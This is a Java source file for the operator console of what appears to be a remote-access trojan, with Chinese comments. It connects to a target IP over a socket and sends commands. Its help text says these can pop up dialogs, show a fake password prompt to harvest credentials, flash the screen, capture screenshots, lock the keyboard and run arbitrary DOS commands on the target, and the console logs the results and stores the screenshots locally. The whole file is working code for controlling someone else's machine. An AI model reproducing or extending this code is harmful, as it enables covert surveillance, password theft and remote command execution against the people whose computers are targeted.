import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;


public class ControlWin {
    Socket socket;
    DataOutputStream dos;
    DataInputStream dis;
    String dosS;
    Scanner in;
    String reString;
    int picNum = 1;
    int PORT = 80;
    String IP = "127.0.0.1";
    String hname;
    String path = "E:\\pic";
    File file;
    BufferedWriter bw;
    String fileName;

    public ControlWin() {
        in = new Scanner(System.in);
        System.out.print("输入IP：");
        IP = in.nextLine().trim();
//        System.out.println("输入主机名：");
//        hname=in.nextLine().toString();
        try {
            socket = new Socket(IP, PORT);
//            socket = new Socket(hname,PORT);
            Date date = new Date();
            SimpleDateFormat sdf = new SimpleDateFormat("MM月dd日HH时mm分");
            fileName = sdf.format(date);
            file = new File("E:\\pic\\" + fileName);
            file.mkdirs();
            file = new File("E:\\pic\\" + fileName + "\\log.txt");
            try {
                bw = new BufferedWriter(new OutputStreamWriter(
                        new FileOutputStream(file)));
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            try {
                // 所有的记录都会存在D:\\pic这个目录下~
                bw.write("开始记录");
                bw.newLine();
                bw.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
            System.out.println("contected");
            dos = new DataOutputStream(socket.getOutputStream());
            dis = new DataInputStream(socket.getInputStream());
            new Thread(new MyInputThread()).start();
            go();
        } catch (UnknownHostException e) {
            e.printStackTrace();
            return;
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }
    }

    public void go() {//开始发送命令
        while (true) {
            System.out.println("intput commend:");
            dosS = in.nextLine().toString();
            if (dosS.startsWith("-d") && dosS.length() == 2) {
                continue;
            } else if (dosS.equals("exit")) {
                break;
            } else if (dosS.equals("")) {
                continue;
            } else if (dosS.endsWith("-help")) {
                System.out.println("-doutmsg msg 以对话框形式输出信息\n"
                                + "-dinmsg msg弹出一个输入对话框+显示信息msg\n"
                                + "-dinpass msg 弹出一个输入密码对话框+显示信息msg\n"
                                + "-flash msg 闪屏并显示msg所表示的文字\n" + "-p:获取图片\n"
                                + "-m l锁定键盘 .....-m a取消锁定\n"
                                + "输入其则执行相应的dos命令，如输入ipconfig 则显示相应的ip信息\n"
                                + "exit:退出");
                continue;
            }
            try {
                dos.writeUTF(dosS);

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void showMsg(String msg) {
        if (msg == null) {
            return;
        }
        try {
            msg = new String(msg.getBytes("utf-8"), "utf-8");
        } catch (UnsupportedEncodingException e1) {
            e1.printStackTrace();
        }
        System.out.println(msg);
        try {
            bw.write(msg);
            bw.flush();
            bw.newLine();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
    /*接受被控制端发送过来的图片*/
    public void getPic() {
        int length = 0;
        File file = new File(path + "\\" + fileName + "\\" + (picNum++)
                + ".jpg");
        byte[] imageData = new byte[8192];
        FileOutputStream fos = null;
        int num = 0;
        try {
            fos = new FileOutputStream(file);
        } catch (FileNotFoundException e3) {
            e3.printStackTrace();
        }
        try {
            length = dis.readInt();
        } catch (IOException e2) {
            e2.printStackTrace();
        }
        while (true) {
            try {
                num = dis.read(imageData, 0, imageData.length);
                fos.write(imageData, 0, num);
                length -= num;
                if (length == 0) {
                    break;
                }
            } catch (Exception e) {
                try {
                    System.out.println("error");
                    fos.flush();
                    fos.close();
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                break;
            }
        }
        try {
            if (file != null)
                fos.close();
        } catch (IOException e1) {
            e1.printStackTrace();
        }
    }

    public static void main(String[] args) {
        new ControlWin();
    }

    class MyInputThread implements Runnable {
        public void run() {
            while (true) {
                try {
                    reString = dis.readUTF();
                    if (reString.equals("1start")) {
                        showMsg(reString);
                    } else if (reString.equals("2start")) {
                        getPic();
                        System.out.println("finish");
                    } else {
                        showMsg(reString);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }
}
